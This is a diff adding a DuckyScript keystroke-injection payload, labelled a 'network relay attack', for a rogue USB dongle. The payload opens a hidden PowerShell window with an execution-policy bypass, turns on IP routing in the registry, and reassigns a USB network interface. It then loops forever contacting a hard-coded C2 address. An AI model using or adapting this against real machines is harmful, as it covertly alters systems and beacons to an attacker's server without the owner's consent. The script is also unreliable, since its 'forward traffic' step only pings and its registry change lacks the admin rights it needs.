@@ -1,0 +1,38 @@
+# ============================================
+# NETWORK RELAY ATTACK
+# ============================================
+# Purpose: Relay network traffic between dongles
+# Time: Continuous
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+# Dongle 1 acts as gateway
+# Dongle 2 acts as relay to C2
+
+# Setup network bridge
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+# Enable routing
+STRING Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 1
+ENTER
+DELAY 200
+
+# Configure Dongle 2 as relay
+STRING netsh interface ip set address "usb0" static 4.3.2.2 255.255.255.0 4.3.2.1
+ENTER
+DELAY 500
+
+# Start relay to C2
+STRING $c2 = "192.168.1.100"; $port = 4444
+ENTER
+DELAY 100
+
+# Forward traffic
+STRING while ($true) { Test-Connection $c2 -Count 1; Start-Sleep 60 }
+ENTER
